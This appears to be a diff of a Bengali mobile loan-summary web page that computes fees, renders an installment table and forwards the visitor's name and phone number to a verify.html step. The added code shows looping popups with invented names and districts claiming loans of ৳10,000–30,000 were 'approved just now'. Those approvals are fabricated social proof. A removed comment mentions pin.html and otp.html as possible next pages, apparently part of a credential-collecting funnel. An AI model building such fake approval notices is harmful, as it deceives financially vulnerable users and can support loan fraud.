@@ -3,300 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>লোনের বিবরণ ও কিস্তি</title>
+    <title>লোনের বিবরণ</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { background: #0f172a; min-height: 100vh; display: flex; justify-content: center; }
+        .container { width: 100%; max-width: 450px; background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; position: relative; }
+        .header { background: linear-gradient(135deg, #1e3a8a, #3b82f6); color: #ffffff; padding: 30px 20px 50px; text-align: center; }
+        .header h2 { font-size: 22px; margin-bottom: 6px; }
+        .header p { font-size: 13px; opacity: 0.9; }
+        .card-wrap { margin: -30px 16px 20px; background: #ffffff; border-radius: 16px; box-shadow: 0 8px 25px rgba(0,0,0,0.08); padding: 16px; flex-grow: 1; display: flex; flex-direction: column; }
+        .banner { background: linear-gradient(135deg, #1e3a8a, #2563eb); border-radius: 12px; padding: 18px 10px; display: flex; justify-content: space-around; color: #ffffff; text-align: center; margin-bottom: 20px; }
+        .col { flex: 1; }
+        .col:not(:last-child) { border-right: 1px solid rgba(255,255,255,0.2); }
+        .col span { font-size: 11px; opacity: 0.9; display: block; margin-bottom: 5px; }
+        .col strong { font-size: 16px; }
+        .schedule-table { width: 100%; border-collapse: collapse; font-size: 13px; margin-bottom: 25px; border: 1px solid #e2e8f0; border-radius: 10px; overflow: hidden; }
+        .schedule-table th { background: #f1f5f9; color: #475569; padding: 10px; text-align: left; }
+        .schedule-table td { padding: 12px 10px; border-top: 1px solid #e2e8f0; color: #1e293b; }
+        .btn-next { margin-top: auto; display: flex; align-items: center; justify-content: center; gap: 10px; padding: 15px; background: linear-gradient(135deg, #1e3a8a, #3b82f6); color: #ffffff; text-decoration: none; border-radius: 30px; font-weight: bold; }
 
-        body {
-            background-color: #f7f8fa;
-            display: flex;
-            justify-content: center;
-            min-height: 100vh;
-        }
-
-        .phone-wrapper {
-            width: 100%;
-            max-width: 430px;
-            background: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            position: relative;
-        }
-
-        /* Top Header */
-        .header-bg {
-            background: linear-gradient(180deg, #f05a22 0%, #ea531b 100%);
-            padding: 25px 20px 42px;
-            text-align: center;
-            border-bottom-left-radius: 35px;
-            border-bottom-right-radius: 35px;
-            color: #ffffff;
-        }
-
-        /* Blank Circle for Logo */
-        .logo-circle {
-            width: 70px;
-            height: 70px;
-            background: #ffffff;
-            border-radius: 50%;
-            margin: 0 auto 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            border: 2px solid rgba(255, 255, 255, 0.8);
-        }
-
-        .logo-circle img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: block;
-        }
-
-        .header-bg h1 {
-            font-size: 21px;
-            font-weight: 700;
-            margin-bottom: 6px;
-        }
-
-        .header-bg p {
-            font-size: 13px;
-            opacity: 0.95;
-        }
-
-        /* 3-Column Summary Card */
-        .summary-card {
-            background: #f05a22;
-            margin: -24px 16px 0;
-            border-radius: 14px;
-            display: flex;
-            padding: 14px 6px;
-            color: #ffffff;
-            box-shadow: 0 4px 12px rgba(240, 90, 34, 0.25);
-        }
-
-        .summary-item {
-            flex: 1;
-            text-align: center;
-            position: relative;
-        }
-
-        .summary-item:not(:last-child)::after {
-            content: '';
-            position: absolute;
-            right: 0;
-            top: 15%;
-            height: 70%;
-            width: 1px;
-            background: rgba(255, 255, 255, 0.25);
-        }
-
-        .summary-item .label {
-            font-size: 11px;
-            margin-bottom: 6px;
-            opacity: 0.9;
-        }
-
-        .summary-item .value {
-            font-size: 16px;
-            font-weight: 700;
-        }
-
-        /* Installment Details */
-        .content-area {
-            padding: 24px 20px;
-            flex-grow: 1;
-        }
-
-        .table-head {
-            display: flex;
-            justify-content: space-between;
-            color: #d84315;
-            font-size: 14px;
-            font-weight: 700;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #f1f2f6;
-        }
-
-        .installment-list {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .table-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 0;
-            font-size: 13.5px;
-            color: #333333;
-            border-bottom: 1px solid #f3f4f6;
-        }
-
-        .table-row .col-title {
-            width: 30%;
-            font-weight: 600;
-        }
-
-        .table-row .col-date {
-            width: 40%;
-            text-align: center;
-            color: #616161;
-            font-size: 12.5px;
-        }
-
-        .table-row .col-amount {
-            width: 30%;
-            text-align: right;
-            font-weight: 700;
-            color: #e64a19;
-        }
-
-        /* Footer Action */
-        .footer-action {
-            padding: 20px;
-            margin-top: auto;
-        }
-
-        .btn-submit {
-            width: 100%;
-            background: linear-gradient(90deg, #f05a22 0%, #ff6e38 100%);
-            color: #ffffff;
-            border: none;
-            padding: 14px 20px;
-            border-radius: 25px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(240, 90, 34, 0.35);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            text-decoration: none;
-        }
+        .loan-popup { position: fixed; bottom: 20px; left: 20px; background: #ffffff; color: #1e293b; padding: 12px 16px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15); display: flex; align-items: center; gap: 12px; z-index: 9999; max-width: 340px; border-left: 5px solid #16a34a; opacity: 0; transform: translateY(30px); transition: all 0.5s ease-in-out; pointer-events: none; }
+        .loan-popup.show { opacity: 1; transform: translateY(0); pointer-events: auto; }
+        .popup-icon { width: 38px; height: 38px; background: #dcfce7; color: #16a34a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; }
+        .popup-content { display: flex; flex-direction: column; }
+        .popup-title { font-size: 13.5px; font-weight: 700; color: #0f172a; margin-bottom: 2px; }
+        .popup-desc { font-size: 12px; color: #16a34a; font-weight: 600; }
+        .popup-time { font-size: 10px; color: #94a3b8; margin-top: 2px; }
     </style>
 </head>
 <body>
 
-<div class="phone-wrapper">
-    <!-- Header with Blank Logo Circle -->
-    <div class="header-bg">
-        <div class="logo-circle">
-            <!-- আপনার ওয়েবসাইটের ছবি/লোগো পরবর্তীতে এখানে যুক্ত করবেন -->
-        </div>
-        <h1>লোনের বিবরণ ও কিস্তি</h1>
-        <p>আপনার আবেদনের হিসাবগুলো যাচাই করুন</p>
+<div class="container">
+    <div class="header">
+        <h2>লোনের সারাংশ</h2>
+        <p>তথ্যগুলো যাচাই করে নিশ্চিত করুন</p>
     </div>
 
-    <!-- 3-Column Summary Box -->
-    <div class="summary-card">
-        <div class="summary-item">
-            <div class="label">লোন পরিমাণ</div>
-            <div class="value">৳<span id="loanAmount">০</span></div>
+    <div class="card-wrap">
+        <div class="banner">
+            <div class="col"><span>লোন পরিমাণ</span><strong id="dispAmount">৳০</strong></div>
+            <div class="col"><span>মোট চার্জ/মুনাফা</span><strong id="dispFee">৳০</strong></div>
+            <div class="col"><span>সর্বমোট দেয়</span><strong id="dispTotal">৳০</strong></div>
         </div>
-        <div class="summary-item">
-            <div class="label">মোট চার্জ/মুনাফা</div>
-            <div class="value">৳<span id="interestAmount">০</span></div>
-        </div>
-        <div class="summary-item">
-            <div class="label">সর্বমোট পে</div>
-            <div class="value">৳<span id="totalAmount">০</span></div>
-        </div>
+
+        <table class="schedule-table">
+            <thead>
+                <tr>
+                    <th>কিস্তি</th>
+                    <th>তারিখ</th>
+                    <th style="text-align: right;">পরিমাণ</th>
+                </tr>
+            </thead>
+            <tbody id="rows"></tbody>
+        </table>
+
+        <a id="nextLink" href="verify.html" class="btn-next">
+            <span>সম্মতি দিন ও এগিয়ে যান</span>
+            <i class="fa-solid fa-arrow-right"></i>
+        </a>
     </div>
+</div>
 
-    <!-- Installment Details Table -->
-    <div class="content-area">
-        <div class="table-head">
-            <span>কিস্তি</span>
-            <span>তারিখ</span>
-            <span>পরিমাণ</span>
-        </div>
-
-        <div id="installmentContainer" class="installment-list">
-            <!-- জাভাস্ক্রিপ্ট দিয়ে কিস্তির হিসাবগুলো লাইভ তৈরি হবে -->
-        </div>
-    </div>
-
-    <!-- Submit Button (সরাসরি পরবর্তী পেজে যাবে) -->
-    <div class="footer-action">
-        <button type="button" class="btn-submit" onclick="goToNextStep()">
-            সম্মতি দিন ও এগিয়ে যান &rarr;
-        </button>
+<div id="loanAlert" class="loan-popup">
+    <div class="popup-icon"><i class="fa-solid fa-circle-check"></i></div>
+    <div class="popup-content">
+        <span class="popup-title" id="popName">রহিমা খাতুন (ঢাকা)</span>
+        <span class="popup-desc" id="popAmount">৳১০,০০০ লোন অনুমোদিত হয়েছে</span>
+        <span class="popup-time" id="popTime">এইমাত্র</span>
     </div>
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", function () {
-    // ১. URL প্যারামিটার অথবা localStorage থেকে অ্যামাউন্ট ও মেয়াদ সংগ্রহ
     const params = new URLSearchParams(window.location.search);
-    const urlAmt = params.get('amount');
-    const urlMonths = params.get('months');
-    
-    const localAmt = localStorage.getItem('selectedLoanAmount');
-    const localMonths = localStorage.getItem('selectedLoanMonths');
+    const name = params.get('name') || '';
+    const phone = params.get('phone') || '';
+    const rawAmount = params.get('amount') || '3000';
+    const rawTenure = params.get('tenure') || '3';
 
-    // পূর্ববর্তী পেজ থেকে পাওয়া অ্যামাউন্ট (না পেলে ডিফল্ট ৩,০০০)
-    const loan = parseFloat(urlAmt || localAmt || 3000);
-    const months = parseInt(urlMonths || localMonths || 3);
+    const numAmount = parseInt(rawAmount.replace(/[^0-9]/g, '')) || 3000;
+    const numMonths = parseInt(rawTenure.replace(/[^0-9]/g, '')) || 3;
 
-    // ২. লাভ ও কিস্তির লাইভ হিসাব (৪.৫% প্রফিট রেট)
-    const profitRate = 0.045; 
-    const profit = Math.round(loan * profitRate);
-    const total = loan + profit;
-    const perInstallment = Math.round(total / months);
+    const fee = Math.round(numAmount * 0.015 * numMonths);
+    const total = numAmount + fee;
+    const monthly = Math.round(total / numMonths);
 
-    // ৩. ইংরেজী সংখ্যা বাংলায় কনভার্ট করার ফাংশন
-    function formatBangla(num) {
-        return num.toLocaleString('en-US').replace(/[0-9]/g, function(d) {
-            return ['০','১','২','৩','৪','৫','৬','৭','৮','৯'][d];
-        });
+    function toBn(num) {
+        const bn = ['০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯'];
+        return num.toString().replace(/[0-9]/g, d => bn[d]);
     }
 
-    // ৪. সামারি কার্ডে লাইভ মান বসানো
-    document.getElementById('loanAmount').innerText = formatBangla(loan);
-    document.getElementById('interestAmount').innerText = formatBangla(profit);
-    document.getElementById('totalAmount').innerText = formatBangla(total);
+    document.getElementById('dispAmount').innerText = '৳' + toBn(numAmount.toLocaleString('en-US'));
+    document.getElementById('dispFee').innerText = '৳' + toBn(fee.toLocaleString('en-US'));
+    document.getElementById('dispTotal').innerText = '৳' + toBn(total.toLocaleString('en-US'));
 
-    // ৫. কিস্তির তালিকা ডায়নামিকালি তৈরি
-    const container = document.getElementById('installmentContainer');
-    container.innerHTML = '';
+    const tbody = document.getElementById('rows');
+    const today = new Date();
+    const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
 
-    const monthNames = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
-    const now = new Date();
-
-    for (let i = 1; i <= months; i++) {
-        const targetDate = new Date(now.getFullYear(), now.getMonth() + i, 10);
-        const formattedDate = `10 ${monthNames[targetDate.getMonth()]}, ${targetDate.getFullYear()}`;
-
-        const row = document.createElement('div');
-        row.className = 'table-row';
-        row.innerHTML = `
-            <span class="col-title">কিস্তি ${formatBangla(i)}</span>
-            <span class="col-date">${formattedDate}</span>
-            <span class="col-amount">৳${formatBangla(perInstallment)}</span>
+    for (let i = 1; i <= numMonths; i++) {
+        const d = new Date(today.getFullYear(), today.getMonth() + i, today.getDate());
+        tbody.innerHTML += `
+            <tr>
+                <td>কিস্তি ${toBn(i)}</td>
+                <td>${d.getDate()} ${months[d.getMonth()]}, ${d.getFullYear()}</td>
+                <td style="text-align: right; font-weight: bold; color: #1e3a8a;">৳${toBn(monthly)}</td>
+            </tr>
         `;
-        container.appendChild(row);
     }
-});
 
-// বাটনে ক্লিক করলে পরবর্তী পেজে যাওয়ার ফাংশন
-function goToNextStep() {
-    // আপনার পরবর্তী ফাইলের নাম যদি pin.html, otp.html, অথবা confirm.html হয়, 
-    // তবে নিচের 'next.html'-এর জায়গায় আপনার ফাইলের আসল নামটি লিখে দিন:
-    const nextDestination = 'next.html'; 
+    document.getElementById('nextLink').href = "verify.html?name=" + encodeURIComponent(name) + "&phone=" + encodeURIComponent(phone) + "&amount=" + encodeURIComponent(rawAmount);
 
-    window.location.href = nextDestination;
-}
+    const loanData = [
+        { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
+        { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
+        { name: "সুমন হোসেন", district: "বগুড়া", amount: "৩০,০০০", time: "১ মিনিট আগে" },
+        { name: "ফারজানা আক্তার", district: "চট্টগ্রাম", amount: "১৫,০০০", time: "এইমাত্র" }
+    ];
+
+    let currentIndex = 0;
+    const popupEl = document.getElementById("loanAlert");
+    const nameEl = document.getElementById("popName");
+    const amountEl = document.getElementById("popAmount");
+    const timeEl = document.getElementById("popTime");
+
+    function showNextNotification() {
+        const item = loanData[currentIndex];
+        nameEl.innerText = `${item.name} (${item.district})`;
+        amountEl.innerText = `৳${item.amount} লোন অনুমোদিত হয়েছে`;
+        timeEl.innerText = item.time;
+        popupEl.classList.add("show");
+        setTimeout(() => { popupEl.classList.remove("show"); }, 4000);
+        currentIndex = (currentIndex + 1) % loanData.length;
+    }
+
+    setTimeout(() => { showNextNotification(); setInterval(showNextNotification, 8000); }, 2000);
 </script>
-
 </body>
 </html>
